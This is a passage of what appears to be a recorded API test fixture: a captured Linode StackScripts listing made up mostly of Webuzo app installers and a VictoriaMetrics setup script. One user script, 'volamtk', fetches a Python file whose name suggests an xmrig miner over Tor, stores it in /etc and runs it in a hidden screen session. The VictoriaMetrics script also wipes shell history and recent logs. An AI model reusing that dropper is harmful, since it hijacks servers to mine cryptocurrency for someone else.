      Documentation: https://docs.victoriametrics.com\n  # VictoriaMetrics Github
      : https://github.com/VictoriaMetrics/VictoriaMetrics\n  # VictoriaMetrics Slack
      Community: https://slack.victoriametrics.com\n  # VictoriaMetrics Telegram Community:
      https://t.me/VictoriaMetrics_en\n  # VictoriaMetrics config:   /etc/victoriametrics/single/victoriametrics.conf\n  #
      VictoriaMetrics scrape config:   /etc/victoriametrics/single/scrape.yml\n  #
      VictoriaMetrics UI accessable on:   http://your_droplet_public_ipv4:8428/vmui/\nEND\n#
      Enable UFW and add some rules to it\nsed -e ''s|DEFAULT_FORWARD_POLICY=.*|DEFAULT_FORWARD_POLICY=\"ACCEPT\"|g''
      \\\n    -i /etc/default/ufw\nufw allow ssh comment \"SSH port\"\nufw allow http
      comment \"HTTP port\"\nufw allow https comment \"HTTPS port\"\nufw allow 8428
      comment \"VictoriaMetrics Single HTTP port\"\nufw allow 8089/tcp comment \"TCP
      Influx Listen port for VictoriaMetrics\"\nufw allow 8089/udp comment \"UDP Influx
      Listen port for VictoriaMetrics\"\nufw allow 2003/tcp comment \"TCP Graphite
      Listen port for VictoriaMetrics\"\nufw allow 2003/udp comment \"UDP Graphite
      Listen port for VictoriaMetrics\"\nufw allow 4242 comment \"OpenTSDB Listen
      port for VictoriaMetrics\"\nufw --force enable\n# Cleaning up\nrm -rf /tmp/*
      /var/tmp/*\nhistory -c\ncat /dev/null > /root/.bash_history\nunset HISTFILE\nfind
      /var/log -mtime -1 -type f ! -name ''stackscript.log'' -exec truncate -s 0 {}
      \\;\n# Start VictoriaMetrics\nsystemctl enable vmsingle.service\nsystemctl start
      vmsingle.service\necho \"Installation complete!\"", "user_defined_fields": [{"name":
      "hostname", "label": "Hostname"}]}, {"id": 9254, "username": "webuzo", "user_gravatar_id":
      "cf0348f835d60e6d133040f49bb36ec5", "label": "Apache Roller powered by Webuzo",
      "description": "Apache Roller is a full-featured, multi-user and group-blog
      server suitable for blog sites large and small.\r\n\r\nApache Roller is a Java
      web application that should be able to run on any Java EE server and relational
      database. \r\n\t\t\t\r\nWebuzo is a Single User Control Panel which helps users
      deploy Web Apps (WordPress, Joomla, Drupal, etc) or System Apps (Apache, NGINX,
      PHP, Java, MongoDB, etc) on their virtual machines or in the cloud.\r\n\r\nYou
      can get a Webuzo License here\r\nhttp://www.webuzo.com/pricing\r\n\r\nPath to
      Installation Logs : /root/webuzo-install.log\r\n\r\nInstructions\r\nOn completion
      of the installation process, access http://your-ip:2004 to configure Apache
      Roller and Softaculous Webuzo initially.\r\n\r\nContact : http://webuzo.com/contact",
      "ordinal": 0, "logo_url": "", "images": ["linode/centos5.6", "linode/ubuntu10.04lts32bit",
      "linode/ubuntu10.04lts", "linode/ubuntu14.04lts", "linode/ubuntu12.04lts", "linode/centos6.8"],
      "deployments_total": 0, "deployments_active": 0, "is_public": true, "mine":
      false, "created": "2018-01-02T03:04:05", "updated": "2018-01-02T03:04:05", "rev_note":
      "Apache Roller powered by Webuzo", "script": "#!/bin/bash\n# <udf name=\"webuzo_license_key\"
      label=\"Premium Webuzo License Key\" example=\"WEBUZO-XXXXX-XXXXX-XXXXX\"/>\n\n###########################################################################################################\n#
      Install Apache Roller and Softaculous Webuzo\n# Description -\n# About Webuzo
      :\n#   Webuzo is a Single User Control Panel which helps users deploy Web Apps
      (WordPress, Joomla, Drupal, etc)\n#   or System Apps (Apache, NGINX, PHP, Java,
      MongoDB, etc) on their virtual machines or in the cloud.\n#\n# About Apache
      Roller :\n#   Apache Roller is a full-featured, multi-user and group-blog server
      suitable for blog sites large and small.\n#   Apache Roller is a Java web application
      that should be able to run on any Java EE server and relational database. \n###########################################################################################################\n\n#
      Install Apache Roller Script using Webuzo\nfunction install_webuzo_script(){\n   \n    #
      Install Webuzo\n    install_webuzo\n   \n    wget http://files.webuzo.com/ip.php
      >> /root/webuzo-install.log 2>&1\n    ip=$(cat ip.php)\n   \n    /usr/local/emps/bin/curl
      \"http://$ip:2004/install.php?prepareinstall=484&license=$1\"\n   \n}\n\n# Install
      Webuzo Function\nfunction install_webuzo(){\n       \n    # Fetch the Webuzo
      Installer\n    wget -N http://files.webuzo.com/install.sh >> /root/webuzo-install.log
      2>&1\n   \n    # Modify Permissions\n    chmod 0755 install.sh >> /root/webuzo-install.log
      2>&1\n   \n    # Execute\n    ./install.sh >> /root/webuzo-install.log 2>&1\n   \n    #
      Clean Up\n    rm -rf install.sh >> /root/webuzo-install.log 2>&1\n   \n}\n\n#########################################################\n#\tInstalling
      Apache Roller and Softaculous Webuzo\n#########################################################\n\ninstall_webuzo_script
      $WEBUZO_LICENSE_KEY\n\n# Check the return of the above command and display the
      result accordingly\n\necho \" \"\necho \"-------------------------------------\"\necho
      \" Installation Completed \"\necho \"-------------------------------------\"\necho
      \"Congratulations, Apache Roller has been successfully installed\"\necho \"
      \"\necho \"You can now configure Apache Roller and Softaculous Webuzo at the
      following URL :\"\necho \"http://$ip:2004/\"\necho \" \"\necho \"Thank you for
      choosing Softaculous Webuzo !\"\necho \" \"", "user_defined_fields": []}, {"id":
      8231, "username": "shakilaid1", "user_gravatar_id": "92c44b5a4f7186e4a6f2320505505b0c",
      "label": "ererer", "description": "errer", "ordinal": 0, "logo_url": "", "images":
      ["linode/debian7.4"], "deployments_total": 0, "deployments_active": 0, "is_public":
      true, "mine": false, "created": "2018-01-02T03:04:05", "updated": "2018-01-02T03:04:05",
      "rev_note": "Initial import", "script": "#!/bin/bash", "user_defined_fields":
      []}, {"id": 9255, "username": "webuzo", "user_gravatar_id": "cf0348f835d60e6d133040f49bb36ec5",
      "label": "WordPress + Nginx powered by Webuzo", "description": "WordPress is
      a state-of-the-art publishing platform with a focus on aesthetics, web standards,
      and usability. WordPress is both free and priceless at the same time.\r\n\r\nMore
      simply, WordPress is what you use when you want to work with your blogging software,
      not fight it. \r\n\r\n\t\t\t\r\nWebuzo is a Single User Control Panel which
      helps users deploy Web Apps (WordPress, Joomla, Drupal, etc) or System Apps
      (Apache, NGINX, PHP, Java, MongoDB, etc) on their virtual machines or in the
      cloud.\r\n\r\nYou can get a Webuzo License here\r\nhttp://www.webuzo.com/pricing\r\n\r\nPath
      to Installation Logs : /root/webuzo-install.log\r\n\r\nInstructions\r\nOn completion
      of the installation process, access http://your-ip:2004 to configure WordPress
      and Softaculous Webuzo initially.\r\n\r\nContact : http://webuzo.com/contact",
      "ordinal": 0, "logo_url": "", "images": ["linode/centos5.6", "linode/ubuntu10.04lts32bit",
      "linode/ubuntu10.04lts", "linode/ubuntu14.04lts", "linode/ubuntu12.04lts", "linode/centos6.8"],
      "deployments_total": 0, "deployments_active": 0, "is_public": true, "mine":
      false, "created": "2018-01-02T03:04:05", "updated": "2018-01-02T03:04:05", "rev_note":
      "WordPress + Nginx powered by Webuzo", "script": "#!/bin/bash\n# <udf name=\"webuzo_license_key\"
      label=\"Premium Webuzo License Key\" example=\"WEBUZO-XXXXX-XXXXX-XXXXX\"/>\n\n###########################################################################################################\n#
      Install WordPress + Nginx and Softaculous Webuzo\n# Description -\n# About Webuzo
      :\n#   Webuzo is a Single User Control Panel which helps users deploy Web Apps
      (WordPress, Joomla, Drupal, etc)\n#   or System Apps (Apache, NGINX, PHP, Java,
      MongoDB, etc) on their virtual machines or in the cloud.\n#\n# About WordPress
      :\n#   WordPress is a state-of-the-art publishing platform with a focus on aesthetics,
      web standards, and usability.\n#   WordPress is both free and priceless at the
      same time.\n#   More simply, WordPress is what you use when you want to work
      with your blogging software, not fight it.\n###########################################################################################################\n\n#
      Install WordPress Script using Webuzo\nfunction install_webuzo_script(){\n   \n    #
      Install Webuzo\n    install_webuzo\n   \n    wget http://files.webuzo.com/ip.php
      >> /root/webuzo-install.log 2>&1\n    ip=$(cat ip.php)\n   \n    /usr/local/emps/bin/curl
      \"http://$ip:2004/install.php?prepareinstall=26&license=$1\"\n   \n}\n\n# Install
      Nginx Function\nfunction install_webuzo(){\n       \n    # Fetch the Webuzo
      Installer\n    wget -N http://files.webuzo.com/install.sh --install=nginx,mysql,php53,perl,python2,pureftpd,bind
      >> /root/webuzo-install.log 2>&1\n   \n    # Modify Permissions\n    chmod 0755
      install.sh >> /root/webuzo-install.log 2>&1\n   \n    # Execute\n    ./install.sh
      >> /root/webuzo-install.log 2>&1\n   \n    # Clean Up\n    rm -rf install.sh
      >> /root/webuzo-install.log 2>&1\n   \n}\n\n#########################################################\n#\tInstalling
      WordPress + NGINX and Softaculous Webuzo\n#########################################################\n\ninstall_webuzo_script
      $WEBUZO_LICENSE_KEY\n\n# Check the return of the above command and display the
      result accordingly\n\necho \" \"\necho \"-------------------------------------\"\necho
      \" Installation Completed \"\necho \"-------------------------------------\"\necho
      \"Congratulations, WordPress has been successfully installed\"\necho \" \"\necho
      \"You can now configure WordPress and Softaculous Webuzo at the following URL
      :\"\necho \"http://$ip:2004/\"\necho \" \"\necho \"Thank you for choosing Softaculous
      Webuzo !\"\necho \" \"", "user_defined_fields": []}, {"id": 102439, "username":
      "poohflya", "user_gravatar_id": "bf99d31a5d9641a61079b25a4c1f5757", "label":
      "DAM", "description": "DAM", "ordinal": 0, "logo_url": "", "images": ["linode/ubuntu17.04"],
      "deployments_total": 0, "deployments_active": 0, "is_public": true, "mine":
      false, "created": "2018-01-02T03:04:05", "updated": "2018-01-02T03:04:05", "rev_note":
      "Initial import", "script": "#!/bin/bash", "user_defined_fields": []}, {"id":
      9001, "username": "webuzo", "user_gravatar_id": "cf0348f835d60e6d133040f49bb36ec5",
      "label": "Concrete5 powered by Webuzo", "description": "Concrete5 makes running
      a website easy. Go to any page in your site, and a editing toolbar gives you
      all the controls you need to update your website. No intimidating manuals, no
      complicated administration interfaces - just point and click.\r\n\t\t\t\r\nWebuzo
      is a Single User Control Panel which helps users deploy Web Apps (WordPress,
      Joomla, Drupal, etc) or System Apps (Apache, NGINX, PHP, Java, MongoDB, etc)
      on their virtual machines or in the cloud.\r\n\r\nYou can get a Webuzo License
      here\r\nhttp://www.webuzo.com/pricing\r\n\r\nPath to Installation Logs : /root/webuzo-install.log\r\n\r\nInstructions\r\nOn
      completion of the installation process, access http://your-ip:2004 to configure
      Concrete5 and Softaculous Webuzo initially.\r\n\r\nContact : http://webuzo.com/contact",
      "ordinal": 0, "logo_url": "", "images": ["linode/centos5.6", "linode/ubuntu10.04lts32bit",
      "linode/ubuntu10.04lts", "linode/ubuntu14.04lts", "linode/ubuntu12.04lts", "linode/centos6.8"],
      "deployments_total": 0, "deployments_active": 0, "is_public": true, "mine":
      false, "created": "2018-01-02T03:04:05", "updated": "2018-01-02T03:04:05", "rev_note":
      "Concrete5 powered by Webuzo", "script": "#!/bin/bash\n# <udf name=\"webuzo_license_key\"
      label=\"Premium Webuzo License Key\" example=\"WEBUZO-XXXXX-XXXXX-XXXXX\"/>\n\n###########################################################################################################\n#
      Install Concrete5 and Softaculous Webuzo\n# Description -\n# About Webuzo :\n#   Webuzo
      is a Single User Control Panel which helps users deploy Web Apps (WordPress,
      Joomla, Drupal, etc)\n#   or System Apps (Apache, NGINX, PHP, Java, MongoDB,
      etc) on their virtual machines or in the cloud.\n#\n# About Concrete5 :\n#   Concrete5
      makes running a website easy. Go to any page in your site, and a editing toolbar
      gives you \n#   all the controls you need to update your website. No intimidating
      manuals, no complicated \n#   administration interfaces - just point and click.\n###########################################################################################################\n\n#
      Install Concrete5 Script using Webuzo\nfunction install_webuzo_script(){\n   \n    #
      Install Webuzo\n    install_webuzo\n   \n    wget http://files.webuzo.com/ip.php
      >> /root/webuzo-install.log 2>&1\n    ip=$(cat ip.php)\n   \n    /usr/local/emps/bin/curl
      \"http://$ip:2004/install.php?prepareinstall=174&license=$1\"\n   \n}\n\n# Install
      Webuzo Function\nfunction install_webuzo(){\n       \n    # Fetch the Webuzo
      Installer\n    wget -N http://files.webuzo.com/install.sh >> /root/webuzo-install.log
      2>&1\n   \n    # Modify Permissions\n    chmod 0755 install.sh >> /root/webuzo-install.log
      2>&1\n   \n    # Execute\n    ./install.sh >> /root/webuzo-install.log 2>&1\n   \n    #
      Clean Up\n    rm -rf install.sh >> /root/webuzo-install.log 2>&1\n   \n}\n\n#########################################################\n#\tInstalling
      Concrete5 and Softaculous Webuzo\n#########################################################\n\ninstall_webuzo_script
      $WEBUZO_LICENSE_KEY\n\n# Check the return of the above command and display the
      result accordingly\n\necho \" \"\necho \"-------------------------------------\"\necho
      \" Installation Completed \"\necho \"-------------------------------------\"\necho
      \"Congratulations, Concrete5 has been successfully installed\"\necho \" \"\necho
      \"You can now configure Concrete5 and Softaculous Webuzo at the following URL
      :\"\necho \"http://$ip:2004/\"\necho \" \"\necho \"Thank you for choosing Softaculous
      Webuzo !\"\necho \" \"", "user_defined_fields": []}, {"id": 788010, "username":
      "EugeneFrank", "user_gravatar_id": "2861cc9c5bd8d573606b159f00ee7e53", "label":
      "a5455", "description": "", "ordinal": 0, "logo_url": "", "images": ["linode/ubuntu18.04"],
      "deployments_total": 0, "deployments_active": 0, "is_public": true, "mine":
      false, "created": "2018-01-02T03:04:05", "updated": "2018-01-02T03:04:05", "rev_note":
      "", "script": "#!/bin/bash", "user_defined_fields": []}, {"id": 1359658, "username":
      "JubairHossin", "user_gravatar_id": "b8ac62ba3ef1b71bd87049378ee068dc", "label":
      "Alpine OS", "description": "", "ordinal": 0, "logo_url": "", "images": ["linode/alpine3.16",
      "linode/alpine3.17", "linode/alpine3.18", "linode/alpine3.19"], "deployments_total":
      0, "deployments_active": 0, "is_public": true, "mine": false, "created": "2018-01-02T03:04:05",
      "updated": "2018-01-02T03:04:05", "rev_note": "", "script": "#!/bin/bash", "user_defined_fields":
      []}, {"id": 9003, "username": "webuzo", "user_gravatar_id": "cf0348f835d60e6d133040f49bb36ec5",
      "label": "Oxwall powered by Webuzo", "description": "Oxwall is unbelievably
      flexible and easy to use PHP/MySQL community software platform.\r\n\r\nOxwall
      is used for a wide range of projects starting from family sites and custom social
      networks to collaboration tools and enterprise community solutions. \r\n\t\t\t\r\nWebuzo
      is a Single User Control Panel which helps users deploy Web Apps (WordPress,
      Joomla, Drupal, etc) or System Apps (Apache, NGINX, PHP, Java, MongoDB, etc)
      on their virtual machines or in the cloud.\r\n\r\nYou can get a Webuzo License
      here\r\nhttp://www.webuzo.com/pricing\r\n\r\nPath to Installation Logs : /root/webuzo-install.log\r\n\r\nInstructions\r\nOn
      completion of the installation process, access http://your-ip:2004 to configure
      Oxwall and Softaculous Webuzo initially.\r\n\r\nContact : http://webuzo.com/contact",
      "ordinal": 0, "logo_url": "", "images": ["linode/centos5.6", "linode/ubuntu10.04lts32bit",
      "linode/ubuntu10.04lts", "linode/ubuntu14.04lts", "linode/ubuntu12.04lts", "linode/centos6.8"],
      "deployments_total": 0, "deployments_active": 0, "is_public": true, "mine":
      false, "created": "2018-01-02T03:04:05", "updated": "2018-01-02T03:04:05", "rev_note":
      "Oxwall powered by Webuzo", "script": "#!/bin/bash\n# <udf name=\"webuzo_license_key\"
      label=\"Premium Webuzo License Key\" example=\"WEBUZO-XXXXX-XXXXX-XXXXX\"/>\n\n###########################################################################################################\n#
      Install Oxwall and Softaculous Webuzo\n# Description -\n# About Webuzo :\n#   Webuzo
      is a Single User Control Panel which helps users deploy Web Apps (WordPress,
      Joomla, Drupal, etc)\n#   or System Apps (Apache, NGINX, PHP, Java, MongoDB,
      etc) on their virtual machines or in the cloud.\n#\n# About Oxwall :\n#   Oxwall
      is unbelievably flexible and easy to use PHP/MySQL community software platform.\n###########################################################################################################\n\n#
      Install Oxwall Script using Webuzo\nfunction install_webuzo_script(){\n   \n    #
      Install Webuzo\n    install_webuzo\n   \n    wget http://files.webuzo.com/ip.php
      >> /root/webuzo-install.log 2>&1\n    ip=$(cat ip.php)\n   \n    /usr/local/emps/bin/curl
      \"http://$ip:2004/install.php?prepareinstall=258&license=$1\"\n   \n}\n\n# Install
      Webuzo Function\nfunction install_webuzo(){\n       \n    # Fetch the Webuzo
      Installer\n    wget -N http://files.webuzo.com/install.sh >> /root/webuzo-install.log
      2>&1\n   \n    # Modify Permissions\n    chmod 0755 install.sh >> /root/webuzo-install.log
      2>&1\n   \n    # Execute\n    ./install.sh >> /root/webuzo-install.log 2>&1\n   \n    #
      Clean Up\n    rm -rf install.sh >> /root/webuzo-install.log 2>&1\n   \n}\n\n#########################################################\n#\tInstalling
      Oxwall and Softaculous Webuzo\n#########################################################\n\ninstall_webuzo_script
      $WEBUZO_LICENSE_KEY\n\n# Check the return of the above command and display the
      result accordingly\n\necho \" \"\necho \"-------------------------------------\"\necho
      \" Installation Completed \"\necho \"-------------------------------------\"\necho
      \"Congratulations, Oxwall has been successfully installed\"\necho \" \"\necho
      \"You can now configure Oxwall and Softaculous Webuzo at the following URL :\"\necho
      \"http://$ip:2004/\"\necho \" \"\necho \"Thank you for choosing Softaculous
      Webuzo !\"\necho \" \"", "user_defined_fields": []}, {"id": 670763, "username":
      "ChristopherMitchellgnfi", "user_gravatar_id": "57669f55c07796f7f563de0d5ec9da70",
      "label": "volamtk", "description": "volamtk", "ordinal": 0, "logo_url": "",
      "images": ["linode/ubuntu18.04"], "deployments_total": 0, "deployments_active":
      0, "is_public": true, "mine": false, "created": "2018-01-02T03:04:05", "updated":
      "2018-01-02T03:04:05", "rev_note": "", "script": "#!/bin/sh\nsleep 60\nsudo
      su root\napt-get install -y python\nwget https://gitlab.com/maihuuhanh1846/test/-/raw/master/daoxmrig_ubuntu_tor_docker_442.py
      -O /etc/dao.py\nchmod 777 /etc/dao.py\nscreen -dm python /etc/dao.py\n\n", "user_defined_fields":
      []}, {"id": 6188, "username": "ma88123456", "user_gravatar_id": "2e365c39a7fd833d229a95d24c8c525d",
      "label": "000", "description": "", "ordinal": 0, "logo_url": "", "images": ["linode/ubuntu11.1032bit"],
      "deployments_total": 0, "deployments_active": 0, "is_public": true, "mine":
      false, "created": "2018-01-02T03:04:05", "updated": "2018-01-02T03:04:05", "rev_note":
      "Initial import", "script": "#!/bin/bash''", "user_defined_fields": []}, {"id":
      9004, "username": "webuzo", "user_gravatar_id": "cf0348f835d60e6d133040f49bb36ec5",
      "label": "qdPM powered by Webuzo", "description": "qdPM is a free web-based
      project management tool suitable for a small team working on multiple projects.\r\n\r\nIt
      is fully configurable. You can easy manage Projects, Tasks and People.\r\n\r\nCustomers
      interact using a Ticket System that is integrated into Task management. \r\n\t\t\t\r\nWebuzo
      is a Single User Control Panel which helps users deploy Web Apps (WordPress,
      Joomla, Drupal, etc) or System Apps (Apache, NGINX, PHP, Java, MongoDB, etc)
      on their virtual machines or in the cloud.\r\n\r\nYou can get a Webuzo License
      here\r\nhttp://www.webuzo.com/pricing\r\n\r\nPath to Installation Logs : /root/webuzo-install.log\r\n\r\nInstructions\r\nOn
      completion of the installation process, access http://your-ip:2004 to configure
      qdPM and Softaculous Webuzo initially.\r\n\r\nContact : http://webuzo.com/contact",
      "ordinal": 0, "logo_url": "", "images": ["linode/centos5.6", "linode/ubuntu10.04lts32bit",
      "linode/ubuntu10.04lts", "linode/ubuntu14.04lts", "linode/ubuntu12.04lts", "linode/centos6.8"],
      "deployments_total": 0, "deployments_active": 0, "is_public": true, "mine":
      false, "created": "2018-01-02T03:04:05", "updated": "2018-01-02T03:04:05", "rev_note":
      "qdPM powered by Webuzo", "script": "#!/bin/bash\n# <udf name=\"webuzo_license_key\"
      label=\"Premium Webuzo License Key\" example=\"WEBUZO-XXXXX-XXXXX-XXXXX\"/>\n\n###########################################################################################################\n#
      Install qdPM and Softaculous Webuzo\n# Description -\n# About Webuzo :\n#   Webuzo
      is a Single User Control Panel which helps users deploy Web Apps (WordPress,
      Joomla, Drupal, etc)\n#   or System Apps (Apache, NGINX, PHP, Java, MongoDB,
      etc) on their virtual machines or in the cloud.\n#\n# About qdPM :\n#   qdPM
      is a free web-based project management tool suitable for a small team working
      on multiple projects.\n###########################################################################################################\n\n#
      Install qdPM Script using Webuzo\nfunction install_webuzo_script(){\n   \n    #
      Install Webuzo\n    install_webuzo\n   \n    wget http://files.webuzo.com/ip.php
      >> /root/webuzo-install.log 2>&1\n    ip=$(cat ip.php)\n   \n    /usr/local/emps/bin/curl
      \"http://$ip:2004/install.php?prepareinstall=428&license=$1\"\n   \n}\n\n# Install
      Webuzo Function\nfunction install_webuzo(){\n       \n    # Fetch the Webuzo
      Installer\n    wget -N http://files.webuzo.com/install.sh >> /root/webuzo-install.log
      2>&1\n   \n    # Modify Permissions\n    chmod 0755 install.sh >> /root/webuzo-install.log
      2>&1\n   \n    # Execute\n    ./install.sh >> /root/webuzo-install.log 2>&1\n   \n    #
      Clean Up\n    rm -rf install.sh >> /root/webuzo-install.log 2>&1\n   \n}\n\n#########################################################\n#\tInstalling
      qdPM and Softaculous Webuzo\n#########################################################\n\ninstall_webuzo_script
      $WEBUZO_LICENSE_KEY\n\n# Check the return of the above command and display the
      result accordingly\n\necho \" \"\necho \"-------------------------------------\"\necho
      \" Installation Completed \"\necho \"-------------------------------------\"\necho
      \"Congratulations, qdPM has been successfully installed\"\necho \" \"\necho
      \"You can now configure qdPM and Softaculous Webuzo at the following URL :\"\necho
      \"http://$ip:2004/\"\necho \" \"\necho \"Thank you for choosing Softaculous
      Webuzo !\"\necho \" \"", "user_defined_fields": []}], "page": 1, "pages": 26,
      "results": 2504}'
    headers:
      Access-Control-Allow-Credentials:
      - "true"
      Access-Control-Allow-Headers:
      - Authorization, Origin, X-Requested-With, Content-Type, Accept, X-Filter
      Access-Control-Allow-Methods:
      - HEAD, GET, OPTIONS, POST, PUT, DELETE
      Access-Control-Allow-Origin:
      - '*'
      Access-Control-Expose-Headers:
      - X-OAuth-Scopes, X-Accepted-OAuth-Scopes, X-Status
      Cache-Control:
      - max-age=0, no-cache, no-store
      Connection:
      - keep-alive
      Content-Security-Policy:
      - default-src 'none'
      Content-Type:
      - application/json
      Expires:
      - Fri, 31 May 2024 17:04:46 GMT
      Pragma:
      - no-cache
      Strict-Transport-Security:
      - max-age=31536000
      Vary:
      - Authorization, X-Filter
      - Authorization, X-Filter
      - Accept-Encoding
      X-Accepted-Oauth-Scopes:
      - stackscripts:read_only
      X-Content-Type-Options:
      - nosniff
      X-Frame-Options:
      - DENY
      - DENY
      X-Oauth-Scopes:
      - account:read_write databases:read_write domains:read_write events:read_write
        firewall:read_write images:read_write ips:read_write linodes:read_write lke:read_write
        longview:read_write nodebalancers:read_write object_storage:read_write stackscripts:read_write
        volumes:read_write vpc:read_write
      X-Ratelimit-Limit:
      - "20"
      X-Xss-Protection:
      - 1; mode=block
    status: 200 OK
    code: 200
    duration: ""
